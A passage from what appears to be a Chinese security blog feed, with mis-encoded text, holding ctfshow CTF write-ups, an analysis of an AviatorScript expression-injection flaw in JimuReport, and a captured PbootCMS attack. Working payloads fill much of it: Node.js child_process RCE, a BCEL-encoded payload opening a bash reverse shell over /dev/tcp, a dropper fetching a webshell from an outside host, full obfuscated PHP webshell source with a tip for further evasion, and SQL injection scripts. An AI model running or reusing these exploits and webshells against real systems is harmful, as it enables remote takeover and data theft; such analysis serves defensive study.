<p>ä¿®æ”¹ç³»ç»Ÿé…ç½®ä¸­é¡µé¢ç»Ÿè®¡å¤„ä¸º<code>/var/www/html/templates/path.sml</code></p>
<p>ä¿®æ”¹ç³»ç»Ÿé…ç½®ä¸­å¤‡æ¡ˆå·ä¸º</p>
<pre><code>&lt;?=`cat /flag_is_here_es`?&gt;
</code></pre>
<p>è®¿é—®<code>/index.php?action=view&amp;page=new</code>è§¦å‘checkFootå‡½æ•°å³å¯ã€‚</p>
<h2 id="web515">web515</h2>
<p>nodejsçš„é¢˜ç›®</p>
<pre><code class="language-js">var express = require('express');
var _= require('lodash');
var router = express.Router();

/* GET users listing. */
router.get('/', function(req, res, next) {
  res.render('index', { title: 'æˆ‘æ˜¯å¤è¯»æœº' });
});

router.post('/',function(req,res,next){
	if(req.body.user!=null){
		msg = req.body.user;
		if((msg.match(/proto|process|require|exec|var|'|&quot;|:|\[|\]|[0-9]/))!==null || msg.length&gt;40){
		  	res.render('index', { title: 'æ•æ„Ÿä¿¡æ¯ä¸å¤è¯»' });
		}else{
			res.render('index', { title: eval(msg) });
		}
	}else{
		res.render('index', { title: 'æˆ‘æ˜¯å¤è¯»æœº' });
	}
	 
});
module.exports = router;
</code></pre>
<p>å‘½ä»¤æ‰§è¡Œç»•è¿‡<br>
åˆ©ç”¨requestå‚æ•°æ¥ç»•è¿‡</p>
<p>payload</p>
<pre><code>?id=require(&quot;child_process&quot;).execSync(&quot;env&quot;);

user=eval(req.query.id)
</code></pre>
<h2 id="web516">web516</h2>
<p>routes/index.js</p>
<pre><code class="language-js">const router = require('koa-router')()
const User = require('../models/User.js')
const md5 = require('md5-node')

router.get('/', async (ctx, next) =&gt; {
	await ctx.render('index',{msg:'ctfshow'});
	await next();

});

router.post('/signin',async(ctx,next)=&gt;{
  const username = ctx.request.body.username;
  const password = ctx.request.body.password;
  if(username=='admin'){
  	ctx.body={
  		code:'403',
  		msg:'you are not admin'
  	};
  	return;
  }
  const user = await User.findAll({
  	where:{
  		username:username,
  		password:password
  	}
  });

  if(user[0]!==undefined){
  	ctx.body={
  		code:'200',
  		url:'user/'+user[0].id
  	}
  }else{
  	ctx.body={
  		code:'404',
  		msg:'login failed'
  	};
  }
  
});

router.post('/signup',async(ctx,next)=&gt;{
	  const username = ctx.request.body.username;
	  const password = ctx.request.body.password;
	  if(username=='admin'){
	  	ctx.body={
  		code:'403',
  		msg:'you are not admin'
  		};
	  	return;
	  }
	  const u = await User.create({username:username,password:password})
	  ctx.body={
	  	code:0,
	  	msg:'æ³¨å†ŒæˆåŠŸ'
	  }
});

router.get('/user/:id',async(ctx,next)=&gt;{
	const id=ctx.params.id;
	if(id==1){
	  	ctx.body={
  		code:'403',
  		msg:'éç®¡ç†å‘˜æ— æƒæŸ¥çœ‹'
  		};
	  	return;
	  }
	const user = await User.findAll({
		where:{
			id:id
		}
	});

	if(user!==undefined){
		ctx.body='&lt;h3&gt;Hello '+user[0].username+'&lt;/h3&gt; your name is: '+user[0].username+' your id is: '+user[0].id+ ' your password is: '+eval('md5('+user[0].password+')');
	}else{
		ctx.render('/');
	}
});
module.exports = router
</code></pre>
<p>app.js</p>
<pre><code class="language-js">const Koa = require('koa')
const app = new Koa()
const views = require('koa-views')
const json = require('koa-json')
const onerror = require('koa-onerror')
const bodyparser = require('koa-bodyparser')
const logger = require('koa-logger')

const index = require('./routes/index')
const users = require('./routes/users')

// error handler
onerror(app)

// middlewares
app.use(bodyparser({
  enableTypes:['json', 'form', 'text']
}))
app.use(json())
app.use(logger())
app.use(require('koa-static')(__dirname + '/public'))

app.use(views(__dirname + '/views', {
  extension: 'ejs'
}))

// logger
app.use(async (ctx, next) =&gt; {
  const start = new Date()
  await next()
  const ms = new Date() - start
  console.log(`${ctx.method} ${ctx.url} - ${ms}ms`)
})

app.use(async(ctx,next)=&gt;{
	if(ctx.request.body.password!==undefined &amp;&amp; (ctx.request.body.password.match(/proto|JSON|parse|process|require|exec|var|merge|response|body|request/))!==null){
		return
	}else{
		await next()
	}
	
})

// routes
app.use(index.routes(), index.allowedMethods())
app.use(users.routes(), users.allowedMethods())

// error-handling
app.on('error', (err, ctx) =&gt; {
  console.error('server error', err, ctx)
});

module.exports = app
</code></pre>
<p>æ³¨å†Œè´¦å·</p>
<pre><code>username=hello&amp;password=1)%2beval(eval(`ctx.requ`%2b`est.query.id`)
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://fallingskies22.github.io/post-images/1723630212531.png" alt="" loading="lazy"></figure>
<p>ç™»å½•è´¦å·åé€šè¿‡idè®¿é—®</p>
<pre><code>/user/16?id=require(&quot;child_process&quot;).execSync(&quot;env&quot;);
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://fallingskies22.github.io/post-images/1723630246169.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ç§¯æœ¨æŠ¥è¡¨å­˜åœ¨aviatorè¡¨è¾¾å¼æ³¨å…¥æ¼æ´]]></title>
        <id>https://fallingskies22.github.io/post/ji-mu-bao-biao-cun-zai-aviatort-biao-da-shi-zhu-ru-lou-dong/</id>
        <link href="https://fallingskies22.github.io/post/ji-mu-bao-biao-cun-zai-aviatort-biao-da-shi-zhu-ru-lou-dong/">
        </link>
        <updated>2024-08-01T14:33:42.000Z</updated>
        <content type="html"><![CDATA[<h1 id="å‰è¨€">å‰è¨€</h1>
<p>å…ˆä¸å†™</p>
<h1 id="ä»‹ç»">ä»‹ç»</h1>
<p>https://github.com/killme2008/aviatorscript</p>
<p>AviatorScript æ˜¯ä¸€é—¨é«˜æ€§èƒ½ã€è½»é‡çº§å¯„å®¿äº JVM ï¼ˆåŒ…æ‹¬ Android å¹³å°ï¼‰ä¹‹ä¸Šçš„è„šæœ¬è¯­è¨€ã€‚</p>
<p>ç§¯æœ¨æŠ¥è¡¨<br>
https://github.com/jeecgboot/JimuReport</p>
<p>ä¸€æ¬¾å…è´¹çš„æ•°æ®å¯è§†åŒ–æŠ¥è¡¨ï¼Œå«æŠ¥è¡¨ã€ä»ªè¡¨ç›˜å’Œå¤§å±è®¾è®¡ï¼Œåƒæ­å»ºç§¯æœ¨ä¸€æ ·åœ¨çº¿è®¾è®¡æŠ¥è¡¨ï¼åŠŸèƒ½æ¶µç›–ï¼Œæ•°æ®æŠ¥è¡¨ã€æ‰“å°è®¾è®¡ã€å›¾è¡¨æŠ¥è¡¨ã€å¤§å±è®¾è®¡ç­‰ï¼</p>
<p>https://github.com/jeecgboot/JeecgBoot<br>
åœ¨jeecg-bootä¸­æœ‰é›†æˆç§¯æœ¨æŠ¥è¡¨ï¼Œä¸”éå¸¸å¸¸è§ã€‚</p>
<h2 id="æµé‡æ•è·">æµé‡æ•è·</h2>
<p>è¿™é‡Œç•¥ï¼Œåæ­£å°±æ˜¯è¢«æ¼æ´æ‰“äº†ï¼Œç„¶åæŠ“åˆ°æµé‡äº†ï¼Œä¸è¿‡æµé‡åªæœ‰ä¸€åŠã€‚ã€‚ã€‚ã€‚</p>
<p>headå¤´</p>
<pre><code class="language-http">POST /jmreport/save HTTP/2
Content-Type: application/json
</code></pre>
<p>postæ•°æ®å¦‚ä¸‹æ‰€ç¤ºï¼Œçœ‹åˆ°ReflectUtils.defineClasså°±çŸ¥é“åº”è¯¥æ˜¯æ³¨å…¥å†…å­˜é©¬äº†ã€‚</p>
<pre><code class="language-json">{&quot;designerObj&quot;:{&quot;id&quot;:&quot;949097799684018176&quot;,&quot;code&quot;:&quot;20240511102253&quot;,&quot;name&quot;:&quot;test&quot;,&quot;note&quot;:null,&quot;status&quot;:null,&quot;type&quot;:&quot;printinfo&quot;,&quot;jsonStr&quot;:&quot;{\&quot;loopBlockList\&quot;:[],\&quot;printConfig\&quot;:{\&quot;layout\&quot;:\&quot;portrait\&quot;,\&quot;printCallBackUrl\&quot;:\&quot;\&quot;,\&quot;paper\&quot;:\&quot;A4\&quot;,\&quot;isBackend\&quot;:false,\&quot;width\&quot;:210,\&quot;definition\&quot;:1,\&quot;marginX\&quot;:10,\&quot;height\&quot;:297,\&quot;marginY\&quot;:10},\&quot;hidden\&quot;:{\&quot;rows\&quot;:[],\&quot;cols\&quot;:[]},\&quot;dbexps\&quot;:[],\&quot;dicts\&quot;:[],\&quot;freeze\&quot;:\&quot;A1\&quot;,\&quot;dataRectWidth\&quot;:100,\&quot;autofilter\&quot;:{},\&quot;validations\&quot;:[],\&quot;cols\&quot;:{\&quot;len\&quot;:50},\&quot;area\&quot;:false,\&quot;pyGroupEngine\&quot;:false,\&quot;excel_config_id\&quot;:\&quot;949097799684018176\&quot;,\&quot;hiddenCells\&quot;:[],\&quot;zonedEditionList\&quot;:[],\&quot;rows\&quot;:{\&quot;0\&quot;:{\&quot;cells\&quot;:{\&quot;0\&quot;:{\&quot;text\&quot;:\&quot;123\&quot;}}},\&quot;len\&quot;:100},\&quot;rpbar\&quot;:{\&quot;show\&quot;:true,\&quot;pageSize\&quot;:\&quot;\&quot;,\&quot;btnList\&quot;:[]},\&quot;fixedPrintHeadRows\&quot;:[],\&quot;fixedPrintTailRows\&quot;:[],\&quot;displayConfig\&quot;:{},\&quot;background\&quot;:false,\&quot;name\&quot;:\&quot;sheet1\&quot;,\&quot;styles\&quot;:[],\&quot;freezeLineColor\&quot;:\&quot;rgb(185, 185, 185)\&quot;,\&quot;merges\&quot;:[]}&quot;,&quot;apiUrl&quot;:null,&quot;apiMethod&quot;:null,&quot;apiCode&quot;:null,&quot;thumb&quot;:null,&quot;template&quot;:0,&quot;createBy&quot;:&quot;15296066620&quot;,&quot;createTime&quot;:&quot;2024-05-11 10:22:54&quot;,&quot;updateBy&quot;:null,&quot;updateTime&quot;:&quot;2024-05-11 10:22:54&quot;,&quot;dataList&quot;:null,&quot;dictInfo&quot;:null,&quot;delFlag&quot;:0,&quot;viewCount&quot;:0,&quot;cssStr&quot;:null,&quot;jsStr&quot;:null,&quot;pyStr&quot;:null,&quot;tenantId&quot;:null,&quot;isRefresh&quot;:null,&quot;shareViewUrl&quot;:null},&quot;name&quot;:&quot;sheet1&quot;,&quot;freeze&quot;:&quot;A1&quot;,&quot;freezeLineColor&quot;:&quot;rgb(185, 185, 185)&quot;,&quot;styles&quot;:[],&quot;displayConfig&quot;:{},&quot;printConfig&quot;:{&quot;layout&quot;:&quot;portrait&quot;,&quot;printCallBackUrl&quot;:&quot;&quot;,&quot;paper&quot;:&quot;A4&quot;,&quot;isBackend&quot;:false,&quot;width&quot;:210,&quot;definition&quot;:1,&quot;marginX&quot;:10,&quot;height&quot;:297,&quot;marginY&quot;:10},&quot;merges&quot;:[],&quot;rows&quot;:{&quot;0&quot;:{&quot;cells&quot;:{&quot;0&quot;:{&quot;text&quot;:&quot;123&quot;},&quot;1&quot;:{}}},&quot;9&quot;:{&quot;cells&quot;:{&quot;6&quot;:{&quot;text&quot;:&quot;=(use org.springframework.cglib.core.*;use org.springframework.util.*;ReflectUtils.defineClass('org.apache.catalina.filters.$ProxyInterceptor$$Lambda$1',Base64Utils.decodeFromString('yv66vgAAAD
</code></pre>
<h2 id="åˆ†ææµç¨‹">åˆ†ææµç¨‹</h2>
<p>ä¸çŸ¥é“å…·ä½“å•¥æ¼æ´ï¼Œä¸€è„¸æ‡µï¼Œä½†æ˜¯å¤§æ¦‚çŸ¥é“æ˜¯textå‚æ•°é‡Œå¯ä»¥å‘½ä»¤æ‰§è¡Œã€‚</p>
<p>å»ç½‘ä¸Šæœæ¼æ´ï¼Œæœåˆ°ä¸€ä¸ªäººå‘ç°çš„bugğŸ¤£</p>
<p>https://www.cnblogs.com/voyager-fu/p/16091838.html</p>
<p>ä»–åœ¨ä½¿ç”¨æœ‰å•ç‹¬çš„<code>=</code>åœ¨textä¸­æ—¶ä¼šå‡ºé”™ï¼Œåˆ†æå…·ä½“ä»£ç å‘ç°ï¼Œç¨‹åºä¼šå°†<code>=</code>åçš„å­—ç¬¦å½“ä½œAviatorScriptæ¥è§£æã€‚è¿™ä¸ªä¹Ÿå’Œæ•è·çš„æµé‡å¾ˆç¬¦åˆğŸ˜‹</p>
<p>ç»§ç»­å»åçš„å­—ç¬¦å½“ä½œAviatorScriptå®˜ç½‘çœ‹å†å²æ¼æ´ï¼Œå‘ç°å¾ˆæ—©å°±æœ‰äººå‘ç°å­˜åœ¨è¡¨è¾¾å¼æ¼æ´<br>
https://github.com/killme2008/aviatorscript/issues/421<br>
é¡¹ç›®ä½œè€…å»ºè®®æ˜¯å¢åŠ é‰´æƒå’Œæ§åˆ¶å¯ä»¥è®¿é—®çš„ class ç™½åå•ï¼ˆåæ­£å’Œä½œè€…æ²¡å…³ç³»ğŸ˜¤ï¼‰</p>
<p>çœ‹åˆ°æœ€ä¸‹é¢è¿˜æœ‰äººæåˆ°ç§¯æœ¨æŠ¥è¡¨ä¸­çš„å¤šä¸ªä¾èµ–å®‰å…¨æ¼æ´ï¼ˆå°±ä¸ä¿®ï¼‰ğŸ¤£</p>
<p>æ ¹æ®æ–‡ç« æç¤ºï¼Œä½¿ç”¨BCELClassloaderåŠ è½½BCELç¼–ç çš„å½¢å¼å®ŒæˆRCEã€‚</p>
<p>å®˜ç½‘åœ°å€:<br>
http://www.jimureport.com/</p>
<p>åˆ›å»ºä¸€å¼ æŠ¥è¡¨ï¼Œç„¶åæ‰“å¼€<br>
<img src="https://fallingskies22.github.io/post-images/1722527110533.png" alt="" loading="lazy"></p>
<p>ç‚¹å‡»ä¿å­˜ï¼Œå°±ä¼šæœ‰/jmreport/saveçš„æ•°æ®åŒ…äº†ã€‚<br>
<img src="https://fallingskies22.github.io/post-images/1722526832871.png" alt="" loading="lazy"></p>
<p>åœ¨ä¸€ä¸ªtextå‚æ•°ä¸­è¾“å…¥payload<br>
<img src="https://fallingskies22.github.io/post-images/1722527046527.png" alt="" loading="lazy"><br>
payload</p>
<pre><code>=((c=(Class.forName('$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeP$cbN$c2$40$U$3dCK$5bk$95$97$f8$7e$c4$95$c0$c2$s$c6$j$c6$NjbR$c5$88a_$ca$E$86$40k$da$c1$f0Y$baQ$e3$c2$P$f0$a3$8cw$w$B$a2M$e6$de9$e7$9es$e6$a6_$df$l$9f$ANq$60$p$8b$b2$8dul$a8$b2ib$cb$c46$83q$sB$n$cf$Z$b4J$b5$cd$a07$a2$$g$c8y$o$e4$b7$e3Q$87$c7$P$7egHL$d1$8b$C$7f$d8$f6c$a1$f0$94$d4e_$q$MY$afqsQ$t$c8$t$3c$608$aax$D$ff$c9w$87$7e$d8s$5b2$Wa$af$5e$5d$a0$ee$e2$u$e0IB$G$z$YuU$f4$3f9$83$7d9$J$f8$a3$UQ$98$98$d8$n$dc$8a$c6q$c0$af$84z$d7$a2$f7$8e$95$c9$81$B$d3$c4$ae$83$3d$ec$3bX$c1$w$85$d2$90$n$3f$cflv$G$3c$90$M$a5$94$S$91$7b$dd$9c$853$U$e6$c2$fbq$u$c5$88$f2$ed$k$973P$ae$y$$$3f$a5$eb8$84N$7fT$7d$Z0$b5$GU$8b$90K$9dQ$cf$d6$de$c0$5e$d2$f1$SU$p$r5$d8T$9d_$B$96$e9$G$9a$d2$da$a4R$e6$934$M$b0$de$91$a9$bdB$7b$fe$e37$W$fc$Wr$c8S$_$d0$d1$89$v$d2$v$a5$fa$b5$l$d5$l$f2$9c$f6$B$A$A',true,new com.sun.org.apache.bcel.internal.util.ClassLoader())))+(c.exec('bash -c $@|bash 0 echo bash -i &gt;&amp; /dev/tcp/ip/1337 0&gt;&amp;1')))
</code></pre>
<p>åœ¨è®¿é—®ä¸€ä¸‹ç”Ÿæˆçš„æŠ¥è¡¨ï¼Œè¿™é‡Œä½¿ç”¨æ¥å£æ˜¯/jmreport/show</p>
<p>è®¿é—®åçœ‹è§æ–‡æœ¬å†…å®¹å˜æˆä¸‹é¢è¿™æ ·äº†ï¼Œè¿™ä¸ªUNIXProcess@6abe63e7å°±ä»£è¡¨æ‰§è¡ŒæˆåŠŸäº†ã€‚<br>
<img src="https://fallingskies22.github.io/post-images/1722527227775.png" alt="" loading="lazy"></p>
<p>ç„¶åçœ‹çœ‹vpsä¸Šï¼ŒæˆåŠŸè·å–åˆ°shell<br>
<img src="https://fallingskies22.github.io/post-images/1722527302566.png" alt="" loading="lazy"></p>
<figure data-type="image" tabindex="1"><img src="https://fallingskies22.github.io/post-images/1722527309213.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[PHP webshell]è®°ä¸€æ¬¡æ•è·çš„phpå…æ€é©¬]]></title>
        <id>https://fallingskies22.github.io/post/php-webshellji-yi-ci-bu-huo-de-php-mian-sha-ma/</id>
        <link href="https://fallingskies22.github.io/post/php-webshellji-yi-ci-bu-huo-de-php-mian-sha-ma/">
        </link>
        <updated>2024-07-27T02:22:05.000Z</updated>
        <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€</h2>
<p>æ— èŠçš„HWæ—¶å€™ï¼Œåƒç¯‡ä¸€å¾‹çš„æ‰«æå™¨ï¼Œç»ˆäºé‡åˆ°ä¸€ä¸ªåŠäººå·¥ï¼Œpayloadæœ‰ç‚¹è´¨é‡ã€‚</p>
<h2 id="æ•è·payload">æ•è·payload</h2>
<pre><code class="language-http">GET /{pboot:if((&quot;file_put_co&quot;.&quot;ntents&quot;)(&quot;temp.php&quot;,(&quot;base6&quot;.&quot;4_decode&quot;)(&quot;PD9waHAgCmZpbGVfcHV0X2NvbnRlbnRzKCcuL2NvcmUvYmFzaWMvZnVuLnBocCcsZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly9kLnNvZ291YWQudmlwL3R4dC9tYTEudHh0JykpOwplY2hvICd0ZW1wMTExODg4JzsKdW5saW5rKF9fRklMRV9fKTs=&quot;)))}{/pboot:if}/../../?p=20 HTTP/1.1 
Accept-Encoding:identity 
Host:
User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 
Referer:http://n666888.com 
Connection:close 
</code></pre>
<h2 id="åˆ†æ">åˆ†æ</h2>
<p>å…·ä½“è¿™ä¸ªæ˜¯å“ªä¸ªæ¼æ´çš„payloadä¸å¤ªæ¸…æ¥šï¼Œç½‘ä¸Šæœäº†ä¸€ä¸‹å¥½åƒæ˜¯pbootcmsï¼Œä½†æ²¡æœ‰æœåˆ°å…·ä½“çš„æ¼æ´ä¿¡æ¯ã€‚</p>
<p>ç›´æ¥æŠŠbase64ç¼–ç è§£ç çœ‹çœ‹ã€‚</p>
<pre><code class="language-php">&lt;?php 
file_put_contents('./core/basic/fun.php',file_get_contents('http://d.sogouad.vip/txt/ma1.txt'));
echo 'temp111888';
unlink(__FILE__);
</code></pre>
<p>è®¿é—®é“¾æ¥åœ°å€ï¼Œå‘ç°æ˜¯ä¸ªæ··æ·†è¿‡çš„phpé©¬ã€‚</p>
<p>å»å¾®æ­¥æƒ…æŠ¥ç¤¾åŒºæœç´¢ç›¸å…³åŸŸåä¿¡æ¯ï¼Œå‘ç°ä¸åªè¿™ä¸€ä¸ªæ ·æœ¬ã€‚</p>
<figure data-type="image" tabindex="1"><img src="https://fallingskies22.github.io/post-images/1722047676843.png" alt="" loading="lazy"></figure>
<p>è€Œä¸”ma1.txtè¿™ä¸ªæ–‡ä»¶å·²ç»è¢«æ ‡çº¢äº†ï¼Œæˆ‘ä»¬ç›´æ¥æ‰¾ä¸ªç»¿çš„çœ‹çœ‹ã€‚</p>
<p><a href="https://s.threatbook.com/report/file/448bd70dce8919641f5b2678b8588b6f390772f6a2b7927f6ac7dfad0bf46ea2">yj.txt</a></p>
<figure data-type="image" tabindex="2"><img src="https://fallingskies22.github.io/post-images/1722047800332.png" alt="" loading="lazy"></figure>
<p>åªæœ‰ä¸€ä¸ªå¼•æ“æ£€å‡ºï¼Œè€Œä¸”åŠ¨æ€åˆ†æå¤±è´¥ã€‚</p>
<pre><code class="language-php">&lt;?php
global $phpjiami_decrypt;
$phpjiami_decrypt['ï¿½ï¿½Ã®ï¿½ï¿½ï¿½ï¿½Ã‹ï¿½ï¿½ï¿½ï¿½Ö¯ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ö”ï¿½ï¿½Ã¥ï¿½ï¿½']=base64_decode('c3RybGVu'); 
$phpjiami_decrypt['ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Äˆï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ã”ï¿½ï¿½ï¿½ÃˆÖ¯ï¿½']=base64_decode('Y2hy');
$phpjiami_decrypt['ï¿½ï¿½ï¿½ï¿½Öˆï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ö¯ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ãˆï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½']=base64_decode('aGV4ZGVj'); 
$phpjiami_decrypt['ï¿½Ã¾ï¿½Ã‹ï¿½ï¿½ï¿½Ö¾ï¿½ï¿½ï¿½ï¿½ÃˆÖ®Ã‹ï¿½ï¿½Ã”ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½']=base64_decode('aGV4VG9TdHI='); ?&gt;

&lt;?php
class _ {
    static public $phpcms=Null;
    function __construct($l=&quot;error&quot;){
        self::$phpcms=$l;
        @eval(null.null.self::$phpcms);
    }
}
function hexToStr($hex){
    $str=&quot;&quot;;
    for($i=0;$i&lt;$GLOBALS['phpjiami_decrypt']['ï¿½ï¿½Ã®ï¿½ï¿½ï¿½ï¿½Ã‹ï¿½ï¿½ï¿½ï¿½Ö¯ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ö”ï¿½ï¿½Ã¥ï¿½ï¿½']($hex)-1;$i+=2)
        $str.=$GLOBALS['phpjiami_decrypt']['ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Äˆï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ã”ï¿½ï¿½ï¿½ÃˆÖ¯ï¿½']($GLOBALS['phpjiami_decrypt']['ï¿½ï¿½ï¿½ï¿½Öˆï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ö¯ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ãˆï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½']($hex[$i].$hex[$i+1]));

    return $str;

}

$error =null.$GLOBALS['phpjiami_decrypt']['ï¿½Ã¾ï¿½Ã‹ï¿½ï¿½ï¿½Ö¾ï¿½ï¿½ï¿½ï¿½ÃˆÖ®Ã‹ï¿½ï¿½Ã”ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½'](@$_POST[&quot;admin@888&quot;]);
$d =new _($error);

?&gt;
</code></pre>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œä¸»è¦æ˜¯ä½¿ç”¨ä¹±ç çš„å˜é‡åï¼Œæ¥æ··æ·†æ ·æœ¬ï¼Œè¿™é‡Œè‡ªå·±æ„é€ æ—¶å¯ä»¥ç”¨hexç¼–è¾‘å·¥å…·æ¥æ“ä½œã€‚<br>
<img src="https://fallingskies22.github.io/post-images/1722048087404.png" alt="" loading="lazy"></p>
<p>ç„¶åä½¿ç”¨äº†null.null.self::$phpcmsæ¥ä¼ é€’å‚æ•°ï¼Œè®©æŸ¥æ€è½¯ä»¶è¯†åˆ«ä¸äº†å‚æ•°ä¼ é€’å…³ç³»ã€‚</p>
<p>å¤§æ¦‚å°±æ˜¯è¿™æ ·äº†ï¼Œç„¶åä¼ é€’hexç¼–ç åçš„admin@888å‚æ•°ï¼Œå³å¯æ‰§è¡Œå‘½ä»¤ã€‚</p>
<p>æ„Ÿè§‰è¿™é‡Œå¦‚æœä¸ºäº†å†è®©æµé‡åˆ†æå›°éš¾ç‚¹ï¼Œå¯ä»¥å°†hexToSträ¸­çš„<code>$hex[$i].$hex[$i+1])</code>äº¤æ¢ä½ç½®ï¼Œè¿™æ ·ä»æµé‡ä¸èƒ½ä¸€çœ¼å‘ç°å¼‚å¸¸çš„hexç¼–ç ã€‚</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ctfshow]sqli-labs]]></title>
        <id>https://fallingskies22.github.io/post/ctfshowsqli-labs/</id>
        <link href="https://fallingskies22.github.io/post/ctfshowsqli-labs/">
        </link>
        <updated>2024-07-21T03:23:41.000Z</updated>
        <content type="html"><![CDATA[<h2 id="web517">web517</h2>
<p>unionæ³¨å…¥ï¼Œä½¿ç”¨<code>'</code>é—­åˆ</p>
<pre><code class="language-py">import requests
import re

def find_flag(text):
    flag = re.findall(&quot;ctfshow{[0-9a-z-]{36}}&quot;,text)
    print(flag[0])


def send_request(params):
    url = 'http://7409729e-2d15-40b9-8c92-c96092d2a608.challenge.ctf.show/'

    proxies = {
        &quot;http&quot;: &quot;http://127.0.0.1:8080&quot;
    }

    headers = {
        &quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;
    }
    resp = requests.get(url=url,params=params,headers=headers,proxies=proxies)

    return resp.text

params1 = {
    &quot;id&quot;:&quot;-1' union select 1,2,3-- &quot;
}

resp = send_request(params1)

# æŸ¥çœ‹æ‰€æœ‰æ•°æ®åº“å
params2 = {
    &quot;id&quot;:&quot;-1' union select 1,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA),3-- &quot;
}

resp = send_request(params2)

# æŸ¥çœ‹è¡¨å
params3 = {
    &quot;id&quot;:&quot;-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'),3-- &quot;
}

resp = send_request(params3)

# æŸ¥çœ‹åˆ—å
params4 = {
    &quot;id&quot;:&quot;-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='flag'),3-- &quot;
}

resp = send_request(params4)

# æŸ¥çœ‹flag
params5 = {
    &quot;id&quot;:&quot;-1' union select 1,(select group_concat(flag) from ctfshow.flag),3-- &quot;
}

resp = send_request(params5)

find_flag(resp)
</code></pre>
<h2 id="web518">web518</h2>
<p>å¸ƒå°”æ³¨å…¥ï¼Œä¸éœ€è¦é—­åˆ</p>
<pre><code class="language-py">import requests
import re

def find_flag(text):
    flag = re.findall(&quot;ctfshow{[0-9a-z-]{36}}&quot;,text)
    print(flag[0])


def send_request(params):
    url = 'http://0023f82a-87bb-4405-9718-f612b60ea29c.challenge.ctf.show/'

    proxies = {
        &quot;http&quot;: &quot;http://127.0.0.1:8080&quot;
    }

    headers = {
        &quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;
    }
    resp = requests.get(url=url,params=params,headers=headers,proxies=proxies)

    return resp.text

params1 = {
    &quot;id&quot;:&quot;-1 union select 1,2,3-- &quot;
}

resp = send_request(params1)

# æŸ¥çœ‹æ‰€æœ‰æ•°æ®åº“å
params2 = {
    &quot;id&quot;:&quot;-1 union select 1,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA),3-- &quot;
}

resp = send_request(params2)

# æŸ¥çœ‹è¡¨å
params3 = {
    &quot;id&quot;:&quot;-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'),3-- &quot;
}

resp = send_request(params3)

# æŸ¥çœ‹åˆ—å
params4 = {
    &quot;id&quot;:&quot;-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name='flagaa'),3-- &quot;
}

resp = send_request(params4)

# æŸ¥çœ‹flag
params5 = {
    &quot;id&quot;:&quot;-1 union select 1,(select group_concat(flagac) from ctfshow.flagaa),3-- &quot;
}

resp = send_request(params5)

find_flag(resp)
</code></pre>
<h2 id="web519">web519</h2>
<p>unionæ³¨å…¥ï¼Œä½¿ç”¨<code>')</code>é—­åˆ</p>
<pre><code class="language-py">import requests
import re

def find_flag(text):
    flag = re.findall(&quot;ctfshow{[0-9a-z-]{36}}&quot;,text)
    print(flag[0])


def send_request(params):
    url = 'http://2da78177-bddf-46d6-a6af-1db26a56d066.challenge.ctf.show/'

    proxies = {
        &quot;http&quot;: &quot;http://127.0.0.1:8080&quot;
    }

    headers = {
        &quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;
    }
    resp = requests.get(url=url,params=params,headers=headers,proxies=proxies)

    return resp.text

params1 = {
    &quot;id&quot;:&quot;-1') union select 1,2,3-- &quot;
}

resp = send_request(params1)

# æŸ¥çœ‹æ‰€æœ‰æ•°æ®åº“å
params2 = {
    &quot;id&quot;:&quot;-1') union select 1,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA),3-- &quot;
}

resp = send_request(params2)

# æŸ¥çœ‹è¡¨å
params3 = {
    &quot;id&quot;:&quot;-1') union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'),3-- &quot;
}

resp = send_request(params3)

# æŸ¥çœ‹åˆ—å
params4 = {
    &quot;id&quot;:&quot;-1') union select 1,(select group_concat(column_name) from information_schema.columns where table_name='flagaanec'),3-- &quot;
}

resp = send_request(params4)

# æŸ¥çœ‹flag
params5 = {
    &quot;id&quot;:&quot;-1') union select 1,(select group_concat(flagaca) from ctfshow.flagaanec),3-- &quot;
}

resp = send_request(params5)

find_flag(resp)
</code></pre>
<h2 id="web520">web520</h2>
<p>unionæ³¨å…¥ï¼Œä½¿ç”¨<code>&quot;)</code>é—­åˆ</p>
<pre><code class="language-py">import requests
import re

def find_flag(text):
    flag = re.findall(&quot;ctfshow{[0-9a-z-]{36}}&quot;,text)
    print(flag[0])


def send_request(params):
